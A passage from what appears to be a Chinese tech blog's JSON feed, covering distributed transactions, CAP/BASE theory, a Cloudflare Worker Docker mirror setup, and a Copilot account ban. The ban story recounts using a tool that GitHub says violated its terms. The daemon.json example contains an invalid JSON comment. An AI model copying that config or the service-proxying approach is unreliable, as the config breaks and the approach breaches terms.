事务方案的进一步优化。它在事务主动方增加了消息校对的接口，如果事务被动方没有接收到消息，此时可以调用事务主动方提供的消息校对的接口主动获取。</p>\n<p>在可靠消息事务中，事务主动方需要将消息发送出去，并且消息接收方成功接收，这种可靠性发送是由事务主动方保证的；</p>\n<p>但是最大努力通知，事务主动方尽最大努力（重试，轮询....）将事务发送给事务接收方，但是仍然存在消息接收不到，此时需要事务被动方主动调用事务主动方的消息校对接口查询业务消息并消费，这种通知的可靠性是由事务被动方保证的。</p>\n<p>最大努力通知适用于业务通知类型，例如微信交易的结果，就是通过最大努力通知方式通知各个商户，既有回调通知，也有交易查询接口。</p>\n<p><strong>实际应用：</strong></p>\n<p>支付回调，支付服务收到第三方服务支付成功通知后，先更新自己库中付款单支付状态，然后同步通知订单服务支付成功。如果此次同步通知失败，会通过异步脚步不断重试地调用订单服务的接口。</p>\n<h1 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章</h1>\n<p>掘金：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82ODQ0OTAzOTM2NzE4MDEyNDMwI2hlYWRpbmctMjc=\">https://juejin.cn/post/6844903936718012430#heading-27</span></p>\n<p>小米信息技术团队：<span class=\"exturl\" data-url=\"aHR0cHM6Ly94aWFvbWktaW5mby5naXRodWIuaW8vMjAyMC8wMS8wMi9kaXN0cmlidXRlZC10cmFuc2FjdGlvbi8=\">https://xiaomi-info.github.io/2020/01/02/distributed-transaction/</span></p>\n<p>知乎：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC85NTg1MjA0NQ==\">https://zhuanlan.zhihu.com/p/95852045</span></p>\n<p>凤凰架构：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pY3lmZW5peC5jbi9hcmNoaXRlY3QtcGVyc3BlY3RpdmUvZ2VuZXJhbC1hcmNoaXRlY3R1cmUvdHJhbnNhY3Rpb24vZGlzdHJpYnV0ZWQuaHRtbA==\">https://icyfenix.cn/architect-perspective/general-architecture/transaction/distributed.html</span></p>\n<p>分布式事务及实现方案： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZGFpLnRlY2gvbWQvYXJjaC9hcmNoLXotdHJhbnNlY3Rpb24uaHRtbA==\">https://pdai.tech/md/arch/arch-z-transection.html</span></p>\n",
            "tags": [
                "计算机科学",
                "高可用",
                "分布式"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/HighAvailability/CAP_BASE/",
            "url": "https://blog.twelveeee.top/2024/HighAvailability/CAP_BASE/",
            "title": "分布式 CAP 和 BASE 理论 简介",
            "date_published": "2024-08-01T03:00:00.000Z",
            "content_html": "<h1 id=\"分布式-cap-和-base-理论\"><a class=\"anchor\" href=\"#分布式-cap-和-base-理论\">#</a> 分布式 CAP 和 BASE 理论</h1>\n<h1 id=\"cap-理论\"><a class=\"anchor\" href=\"#cap-理论\">#</a> CAP 理论</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLWNuL0NBUCVFNSVBRSU5QSVFNyU5MCU4Ng==\">https://zh.wikipedia.org/zh-cn/CAP 定理</span></p>\n<p><strong>一致性（Consistency）</strong></p>\n<p>写操作之后进行读操作，无论在哪个节点都需要返回写操作的一致值。</p>\n<p><strong>可用性（Availability）</strong></p>\n<p>非故障的节点在合理的时间内返回合理的响应</p>\n<p><strong>分区容错性（Partition Tolerance）</strong></p>\n<p>区间通信可能失败，当网络出现分区后，系统依然能够继续履行职责。</p>\n<p><strong>为什么不能选择 CA 架构</strong></p>\n<p>在分布式的环境下，网络无法做到 100% 可靠，有可能出现故障，因此分区（P）是一个必须的选项。<br />\n如果选择了 CA 而放弃了 P，若发生分区现象：<br />\n为了保证 C，系统需要禁止写入，此时就与 A 发生冲突，<br />\n为了保证 A，会出现正常的分区可以写入数据，有故障的分区不能写入数据，则与 C 就冲突了。<br />\n因此分布式系统理论上不可能选择 CA 架构，而必须选择 CP 或 AP 架构。</p>\n<h1 id=\"cap的实际应用\"><a class=\"anchor\" href=\"#cap的实际应用\">#</a> CAP 的实际应用</h1>\n<h2 id=\"注册中心\"><a class=\"anchor\" href=\"#注册中心\">#</a> 注册中心</h2>\n<p>注册中心解决服务注册和服务发现的问题</p>\n<p><strong>服务注册</strong>：实例将自身服务信息注册到注册中心，这部分信息包括服务的主机 IP 和服务的 Port，以及暴露服务自身状态和访问协议信息等。</p>\n<p><strong>服务发现</strong>：实例请求注册中心所依赖的服务信息，服务实例通过注册中心，获取到注册到其中的服务实例的信息，通过这些信息去请求它们提供的服务。</p>\n<p>目前作为注册中心的一些组件大致有：dubbo 的 zookeeper，springcloud 的 eureka，consul，rocketMq 的 nameServer，hdfs 的 nameNode。</p>\n<p><strong>zookeeper 选择 CP</strong></p>\n<p>zookeep 保证 CP，即任何时刻对 zookeeper 的访问请求能得到一致性的数据结果，同时系统对网络分割具备容错性，但是它不能保证每次服务的可用性。从实际情况来分析，在使用 zookeeper 获取服务列表时，如果 zk 正在选举或者 zk 集群中半数以上的机器不可用，那么将无法获取数据。所以说，zk 不能保证服务可用性。</p>\n<p><strong>eureka 选择 AP</strong></p>\n<p>eureka 保证 AP，eureka 在设计时优先保证可用性，每一个节点都是平等的，一部分节点挂掉不会影响到正常节点的工作，不会出现类似 zk 的选举 leader 的过程，客户端发现向某个节点注册或连接失败，会自动切换到其他的节点，只要有一台 eureka 存在，就可以保证整个服务处在可用状态，只不过有可能这个服务上的信息并不是最新的信息。</p>\n<p><strong>zookeeper 和 eureka 的数据一致性问题</strong></p>\n<p>先要明确一点，eureka 的创建初心就是为一个注册中心，但是 zk 更多是作为分布式协调服务的存在，只不过因为它的特性被赋予了注册中心，它的职责更多是保证数据（配置数据，状态数据）在管辖下的所有服务之间保持一致，所有这个就不难理解为何 zk 被设计成 CP 而不是 AP，zk 最核心的算法 ZAB，就是为了解决分布式系统下数据在多个服务之间一致同步的问题。</p>\n<p>更深层的原因，zookeeper 是按照 CP 原则构建，也就是说它必须保持每一个节点的数据都保持一致，如果 zookeeper 下节点断开或者集群中出现网络分割（例如交换机的子网间不能互访），那么 zk 会将它们从自己的管理范围中剔除，外界不能访问这些节点，即使这些节点是健康的可以提供正常的服务，所以导致这些节点请求都会丢失。</p>\n<p>而 eureka 则完全没有这方面的顾虑，它的节点都是相对独立，不需要考虑数据一致性的问题，这个应该是 eureka 的诞生就是为了注册中心而设计，相对 zk 来说剔除了 leader 节点选取和事务日志极致，这样更有利于维护和保证 eureka 在运行的健壮性。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202408010035707.webp\" alt=\"image\" /></p>\n<p>数据不一致性在注册服务中中会给 eureka 带来什么问题，无非就是某一个节点被注册的服务多，某个节点注册的服务少，在某一个瞬间可能导致某些 ip 节点被调用数少，某些 ip 节点调用数少的问题。也有可能存在一些本应该被删除而没被删除的脏数据。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202408010035629.webp\" alt=\"image\" /></p>\n<p>所以对于注册中心来说，使用 AP 更合适。</p>\n<h2 id=\"分布式锁\"><a class=\"anchor\" href=\"#分布式锁\">#</a> 分布式锁</h2>\n<p><strong>redis 实现分布式锁</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>setnx key value ExpireTime</pre></td></tr></table></figure><p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202408010053939.webp\" alt=\"image\" /></p>\n<p>所以 redis 的复制模式是属于 AP 的模式。保证可用性，在主从复制中 “主” 有数据，但是可能 “从” 还没有数据，这个时候，一旦主挂掉或者网络抖动等各种原因，可能会切换到 “从” 节点，这个时候可能会导致两个业务县城同时获取得两把锁。</p>\n<p>其实并不是 redis 的缺陷，只是 redis 采用了 AP 模型，它本身无法确保我们对一致性的要求。redis 官方推荐 redlock 算法来保证，问题是 redlock 至少需要三个 redis 主从实例来实现，维护成本比较高，相当于 redlock 使用三个 redis 集群实现了自己的另一套一致性算法，比较繁琐。</p>\n<p><strong>zookeeper 实现分布式锁</strong></p>\n<p>zookeeper 的特性</p>\n<ul>\n<li>\n<p>有序节点：当在一个父目录下如 /lock 下创建 有序节点，节点会按照严格的先后顺序创建出自节点 lock000001,lock000002,lock0000003, 以此类推，有序节点能严格保证各个自节点按照排序命名生成。</p>\n</li>\n<li>\n<p>临时节点：客户端建立了一个临时节点，在客户端的会话结束或会话超时，zookepper 会自动删除该解 ID。</p>\n</li>\n<li>\n<p>事件监听：在读取数据时，我们可以对节点设置监听，当节点的数据发生变化（1 节点创建 2 节点删除 3 节点数据变成 4 自节点变成）时，zookeeper 会通知客户端。</p>\n</li>\n</ul>\n<p>结合这几个特点，来看下 zk 是怎么组合分布式锁。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202408010057738.webp\" alt=\"image\" /></p>\n<ol>\n<li>业务线程 - 1 业务线程 - 2 分别向 zk 的 /lock 目录下，申请创建有序的临时节点</li>\n<li>业务线程 - 1 抢到 /lock0001 的文件，也就是在整个目录下最小序的节点，也就是线程 - 1 获取到了锁</li>\n<li>业务线程 - 2 只能抢到 /lock0002 的文件，并不是最小序的节点，线程 2 未能获取锁</li>\n<li>业务线程 - 1 与 lock0001 建立了连接，并维持了心跳，维持的心跳也就是这把锁的租期</li>\n<li>当业务线程 - 1 完成了业务，将释放掉与 zk 的连接，也就是释放了这把锁</li>\n</ol>\n<h1 id=\"base理论\"><a class=\"anchor\" href=\"#base理论\">#</a> BASE 理论</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbC5hY20ub3JnL2RvaS8xMC4xMTQ1LzEzOTQxMjcuMTM5NDEyOA==\">https://dl.acm.org/doi/10.1145/1394127.1394128</span></p>\n<p><strong>基本可用 （Basically Available）</strong></p>\n<p>基本可用是指分布式系统在出现不可预知故障的时候，允许损失部分可用性。但是，这绝不等价于系统不可用。</p>\n<p><strong>软状态（Soft-state）</strong></p>\n<p>软状态指允许系统中的数据存在中间状态（<strong>CAP 理论中的 (C) 数据不一致</strong>），并认为该中间状态的存在不会影响系统的整体可用性，即允许系统在不同节点的数据副本之间进行数据同步的过程存在延时。</p>\n<p><strong>最终一致性（Eventually Consistent）</strong></p>\n<p>最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能够达到一个一致的状态。因此，最终一致性的本质是需要系统保证最终数据能够达到一致，而不需要实时保证系统数据的强一致性。</p>\n<p>BASE 理论是对 CAP 中一致性 C 和可用性 A 权衡的结果，其来源于对大规模互联网系统分布式实践的总结，是基于 CAP 定理逐步演化而来的，它大大降低了我们对系统的要求。</p>\n<p><strong>BASE 的核心思想是</strong>：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。</p>\n<p><strong>分布式一致性的 3 种级别：</strong></p>\n<ol>\n<li><strong>强一致性</strong>：系统写入了什么，读出来的就是什么。</li>\n<li><strong>弱一致性</strong>：不一定可以读取到最新写入的值，也不保证多少时间之后读取到的数据是最新的，只是会尽量保证某个时刻达到数据一致的状态。</li>\n<li><strong>最终一致性</strong>：弱一致性的升级版，系统会保证在一定时间内达到数据一致的状态。</li>\n</ol>\n<p><strong>业界比较推崇是最终一致性级别，但是某些对数据一致要求十分严格的场景比如银行转账还是要保证强一致性。</strong></p>\n<p>那实现最终一致性的具体方式：</p>\n<p><strong>读时修复</strong>：在读取数据时，检测数据的不一致，进行修复。比如 Cassandra 的 Read Repair 实现，具体来说，在向 Cassandra 系统查询数据的时候，如果检测到不同节点的副本数据不一致，系统就自动修复数据。</p>\n<p><strong>写时修复</strong>：在写入数据，检测数据的不一致时，进行修复。比如 Cassandra 的 Hinted Handoff 实现。具体来说，Cassandra 集群的节点之间远程写数据的时候，如果写失败 就将数据缓存下来，然后定时重传，修复数据的不一致性。</p>\n<p><strong>异步修复</strong>：这个是最常用的方式，通过定时对账检测副本数据的一致性，并修复。</p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>ACID 是数据库事务完整性的理论，CAP 是分布式系统设计理论，BASE 是 CAP 理论中 AP 方案的延伸。</p>\n<p>在微服务的构建中，永远都逃离不了 CAP 理论，因为网络永远不稳定，硬件总会老化，软件会可能出现 bug，所以分区容错性在微服务中是躲不过的命题，可以这么说，只要是分布式，只要是集群都面临着 AP 或者 CP 的选择，但你很贪心的时候，既要一致性又要可用性，那只能对一致性作出一点妥协，也就是引入了 BASE 理论，在业务允许的情况下实现最终一致性。</p>\n<p>究竟是选 AP 还是选 CP，真的在于对业务的了解，例如金钱，库存相关会优先考虑 CP 模型，例如社区发帖相关可以优先选择 AP 模型，这个说白了其实基于对业务的了解是一个选择和妥协的过程。</p>\n<blockquote>\n<p>参考资料</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbC5hY20ub3JnL2RvaS8xMC4xMTQ1LzEzOTQxMjcuMTM5NDEyOA==\">https://dl.acm.org/doi/10.1145/1394127.1394128</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82ODQ0OTAzOTM2NzE4MDEyNDMwI2hlYWRpbmctMjI=\">https://juejin.cn/post/6844903936718012430#heading-22</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qYXZhZ3VpZGUuY24vZGlzdHJpYnV0ZWQtc3lzdGVtL3Byb3RvY29sL2NhcC1hbmQtYmFzZS10aGVvcmVtLmh0bWwjYmFzZS0lRTclOTAlODYlRTglQUUlQkElRTQlQjglODklRTglQTYlODElRTclQjQlQTA=\">https://javaguide.cn/distributed-system/protocol/cap-and-base-theorem.html#base - 理论三要素</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDE4LzA3L2NhcC5odG1s\">https://www.ruanyifeng.com/blog/2018/07/cap.html</span></p>\n</blockquote>\n",
            "tags": [
                "计算机科学",
                "高可用",
                "分布式"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/Project/cloudflare-docker-proxy/",
            "url": "https://blog.twelveeee.top/2024/Project/cloudflare-docker-proxy/",
            "title": "搭建使用Cloudflare Worker的Docker 镜像",
            "date_published": "2024-07-06T19:20:00.000Z",
            "content_html": "<h1 id=\"搭建使用cloudflare-worker的docker-镜像\"><a class=\"anchor\" href=\"#搭建使用cloudflare-worker的docker-镜像\">#</a> 搭建使用 Cloudflare Worker 的 Docker 镜像</h1>\n<p>项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NtbGl1L0NGLVdvcmtlcnMtZG9ja2VyLmlv\">GitHub - cmliu/CF-Workers-docker.io</span></p>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>由于众所周知的原因，docker 没办法比较好的访问。本文介绍如何使用 Cloudflare Workers 搭建 Docker 代理服务。</p>\n<p>于是尝试使用了阿里云的镜像服务，本以为需要注册效果会好点，拉完了镜像才发现镜像是踏马 21 年的镜像....</p>\n<h2 id=\"准备\"><a class=\"anchor\" href=\"#准备\">#</a> 准备</h2>\n<p>按照本文，您需要</p>\n<ul>\n<li>\n<p>一个域名（需要转给 Cloudflare ），国内域名不行。</p>\n</li>\n<li>\n<p>一个 Cloudflare 账户（免费）</p>\n</li>\n</ul>\n<p>或者也可以直接用我的服务</p>\n<p><span class=\"spoiler\" title=\"你知道得太多了\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NrZXItcHJveHkudHdlbHZlbG9jYWwudWsv\">https://docker-proxy.twelvelocal.uk/</span></span></p>\n<p>到本文最后看使用方式</p>\n<h1 id=\"绑定域名\"><a class=\"anchor\" href=\"#绑定域名\">#</a> 绑定域名</h1>\n<p>略</p>\n<h1 id=\"构建worker\"><a class=\"anchor\" href=\"#构建worker\">#</a> 构建 worker</h1>\n<p>在 Cloudflare Workers 中创建一个新的 Worker。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070322820.png\" alt=\"\" /></p>\n<p>起一个比较好听的名字。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070322292.png\" alt=\"\" /></p>\n<p>这时候就能通过 worker 的域名访问了</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070323833.png\" alt=\"\" /></p>\n<p>但是由于众所周知的问题，这个域名是没办法在没有魔法的机器上访问的。</p>\n<p>这就引出了下一步，需要给 worker 绑定一个域名</p>\n<h1 id=\"关联worker-域名\"><a class=\"anchor\" href=\"#关联worker-域名\">#</a> 关联 worker 域名</h1>\n<p>在 Cloudflare 控制台首页选择你的域名。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070323130.png\" alt=\"\" /></p>\n<p>创建 DNS 记录，输入域名前缀和 IP 地址（IP 地址可以随便填写，关键是 Proxy 需要勾选）。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070323400.png\" alt=\"\" /></p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070323418.png\" alt=\"\" /></p>\n<p>保存后，添加 Worker 的路由</p>\n<p>格式为  <code>xxx.example.com/* </code></p>\n<p>后面这个  <code>/* </code>  不能省略<img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070323228.png\" alt=\"\" /></p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070323971.png\" alt=\"\" /></p>\n<p>等待几分钟后，检查是否成功。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070323962.png\" alt=\"\" /></p>\n<p>出现了。</p>\n<h1 id=\"测试连接\"><a class=\"anchor\" href=\"#测试连接\">#</a> 测试连接</h1>\n<p>linux 访问这个域名老是不成功，尝试配置 Cloudflare  的 DNS</p>\n<h2 id=\"linux-dns\"><a class=\"anchor\" href=\"#linux-dns\">#</a> Linux DNS</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"nameserver 1.1.1.1<span class=\"token entity\" title=\"\\n\">\\n</span>nameserver 1.0.0.1\"</span> <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> <span class=\"token function\">tee</span> /etc/resolv.conf</pre></td></tr></table></figure><p>测试命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 看 dns 是否能正常使用</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$ <span class=\"token function\">ping</span> baidu.com</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>PING baidu.com <span class=\"token punctuation\">(</span><span class=\"token number\">39.156</span>.66.10<span class=\"token punctuation\">)</span> <span class=\"token number\">56</span><span class=\"token punctuation\">(</span><span class=\"token number\">84</span><span class=\"token punctuation\">)</span> bytes of data.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">64</span> bytes from <span class=\"token number\">39.156</span>.66.10 <span class=\"token punctuation\">(</span><span class=\"token number\">39.156</span>.66.10<span class=\"token punctuation\">)</span>: <span class=\"token assign-left variable\">icmp_seq</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token assign-left variable\">ttl</span><span class=\"token operator\">=</span><span class=\"token number\">50</span> <span class=\"token assign-left variable\">time</span><span class=\"token operator\">=</span><span class=\"token number\">9.29</span> ms</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">64</span> bytes from <span class=\"token number\">39.156</span>.66.10 <span class=\"token punctuation\">(</span><span class=\"token number\">39.156</span>.66.10<span class=\"token punctuation\">)</span>: <span class=\"token assign-left variable\">icmp_seq</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> <span class=\"token assign-left variable\">ttl</span><span class=\"token operator\">=</span><span class=\"token number\">50</span> <span class=\"token assign-left variable\">time</span><span class=\"token operator\">=</span><span class=\"token number\">8.97</span> ms</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 看能不能连到 worker</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>$ <span class=\"token function\">curl</span> http://docker-rouert.twelvelocal.uk/1</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Hello World<span class=\"token operator\">!</span></pre></td></tr></table></figure><h1 id=\"更新worker代码\"><a class=\"anchor\" href=\"#更新worker代码\">#</a> 更新 worker 代码</h1>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070323050.png\" alt=\"\" /></p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070323739.png\" alt=\"\" /></p>\n<p>复制  <code>https://github.com/cmliu/CF-Workers-docker.io/blob/main/_worker.js</code>  的代码进来，粘贴到代码块，并且更改域名</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070323418.png\" alt=\"\" /></p>\n<p>测试效果<img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070323058.png\" alt=\"\" /></p>\n<h1 id=\"使用方式\"><a class=\"anchor\" href=\"#使用方式\">#</a> 使用方式</h1>\n<h2 id=\"1-官方镜像路径前面加域名\"><a class=\"anchor\" href=\"#1-官方镜像路径前面加域名\">#</a> 1. 官方镜像路径前面加域名</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> pull docker.fxxk.dedyn.io/stilleshan/frpc:latest</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> pull docker.fxxk.dedyn.io/library/nginx:stable-alpine3.19-perl</pre></td></tr></table></figure><h2 id=\"2一键设置镜像加速\"><a class=\"anchor\" href=\"#2一键设置镜像加速\">#</a> 2. 一键设置镜像加速</h2>\n<p>修改文件  <code>/etc/docker/daemon.json</code> （如果不存在则创建）</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">mkdir</span> <span class=\"token parameter variable\">-p</span> /etc/docker</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">tee</span> /etc/docker/daemon.json <span class=\"token operator\">&lt;&lt;-</span><span class=\"token string\">'EOF'</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  \"registry-mirrors\": [\"https://docker.fxxk.dedyn.io\"]  # 请替换为您自己的Worker自定义域名</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>EOF</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">sudo</span> systemctl daemon-reload</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">sudo</span> systemctl restart <span class=\"token function\">docker</span></pre></td></tr></table></figure><p>测试效果<img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202407070323487.png\" alt=\"\" /></p>\n",
            "tags": [
                "计算机科学",
                "Project",
                "github",
                "Cloudflare"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/Project/copilot-gpt4-service-ban/",
            "url": "https://blog.twelveeee.top/2024/Project/copilot-gpt4-service-ban/",
            "title": "GitHub Copilot封号及退款过程",
            "date_published": "2024-06-02T03:00:00.000Z",
            "content_html": "<h1 id=\"github-copilot封号及退款过程\"><a class=\"anchor\" href=\"#github-copilot封号及退款过程\">#</a> GitHub Copilot 封号及退款过程</h1>\n<h2 id=\"本次封号原因\"><a class=\"anchor\" href=\"#本次封号原因\">#</a> 本次封号原因</h2>\n<p>使用 copilot-gpt4-service <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FhYW1vb24vY29waWxvdC1ncHQ0LXNlcnZpY2U=\">https://github.com/aaamoon/copilot-gpt4-service</span> 搭建了 ChatGPT Next Web</p>\n<p>具体内容参考 <a href=\"https://blog.twelveeee.top/2024/Project/copilot-gpt4-service/\">https://blog.twelveeee.top/2024/Project/copilot-gpt4-service/</a></p>\n<p>后面  copilot-gpt4-service  的 git 仓库被封了</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202406100126727.png\" alt=\"image-20240610012609543\" /></p>\n<p>但是我还是继续使用本地搭建的服务，真的特别好用，直到 2024-05-14 这一天。。</p>\n<h2 id=\"本次封号现象\"><a class=\"anchor\" href=\"#本次封号现象\">#</a> 本次封号现象</h2>\n<p>日志报错：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">2024</span>-05-14 <span class=\"token number\">15</span>:42:17.392 <span class=\"token punctuation\">[</span>info<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>auth<span class=\"token punctuation\">]</span> Invalid copilot token: missing token: <span class=\"token number\">403</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2024</span>-05-14 <span class=\"token number\">15</span>:42:17.489 <span class=\"token punctuation\">[</span>error<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>auth<span class=\"token punctuation\">]</span> Extension activation failed: <span class=\"token string\">\"Contact Support. You are currently logged in as Twelveeee.\"</span></pre></td></tr></table></figure><p>vscode 报错：</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202406100122120.png\" alt=\"image.png\" /></p>\n<h2 id=\"寻求作者帮助\"><a class=\"anchor\" href=\"#寻求作者帮助\">#</a> 寻求作者帮助</h2>\n<p>寻求 copilot-gpt4-service 作者的的帮助，作者提供了两个参考网站</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FhYW1vb24vcmVhY3Qxcy9pc3N1ZXMvMTI=\">https://github.com/aaamoon/react1s/issues/12</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW51eC5kby90L3RvcGljLzU1MDcw\">https://linux.do/t/topic/55070</span></p>\n<p>看来解封难度非常大，要不直接退款吧。</p>\n<h2 id=\"工单询问是否能够解封\"><a class=\"anchor\" href=\"#工单询问是否能够解封\">#</a> 工单询问是否能够解封</h2>\n<p>2024 年 5 月 15 日 23:34</p>\n<p>把现象和日志给 github support 反馈，后续反馈内容如下：</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202406100146529.png\" alt=\"image-20240610012952117\" /></p>\n<blockquote>\n<p>Hey there Twelveeee,</p>\n<p>Thanks for writing in to Technical Support.</p>\n<p>Your access to Copilot has been restricted because our system has detected excessive/automated usage, programmatic API access or prompt manipulations, which is against our <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vZW4vc2l0ZS1wb2xpY3kvZ2l0aHViLXRlcm1zL2dpdGh1Yi10ZXJtcy1vZi1zZXJ2aWNl\">Terms of Service.</span> Usage should also be restricted to our <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vZW4vY29waWxvdC91c2luZy1naXRodWItY29waWxvdC9nZXR0aW5nLXN0YXJ0ZWQtd2l0aC1naXRodWItY29waWxvdA==\">supported extensions</span>.</p>\n<p>Regrettably, we are unable to reinstate your access at this time.</p>\n<p>Be advised that repeated violations of our <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vZW4vc2l0ZS1wb2xpY3kvZ2l0aHViLXRlcm1zL2dpdGh1Yi10ZXJtcy1vZi1zZXJ2aWNl\">Terms of Service</span> or <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vZW4vc2l0ZS1wb2xpY3kvYWNjZXB0YWJsZS11c2UtcG9saWNpZXMvZ2l0aHViLWFjY2VwdGFibGUtdXNlLXBvbGljaWVz\">GitHub Acceptable Use Policies</span> may lead to the permanent suspension of your GitHub account.</p>\n<p>All the best,<br />\nRick</p>\n<p>GitHub Support</p>\n</blockquote>\n<p>没办法恢复我的访问权限。</p>\n<h2 id=\"工单询问能否按比例退款\"><a class=\"anchor\" href=\"#工单询问能否按比例退款\">#</a> 工单询问能否按比例退款</h2>\n<p>2024 年 5 月 23 日 14:20</p>\n<p>询问是否能够按比例退款</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202406100146596.png\" alt=\"image-20240610013404139\" /></p>\n<hr />\n<p>2024 年 5 月 24 日 15:46</p>\n<p>确认退款流程，是否需要我先手动取消 copilot 的订阅。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202406100146282.png\" alt=\"image-20240610013423899\" /></p>\n<hr />\n<p>2024 年 5 月 27 日 15:23</p>\n<p>取消 copilot 的订阅，成功退款</p>\n<p><img 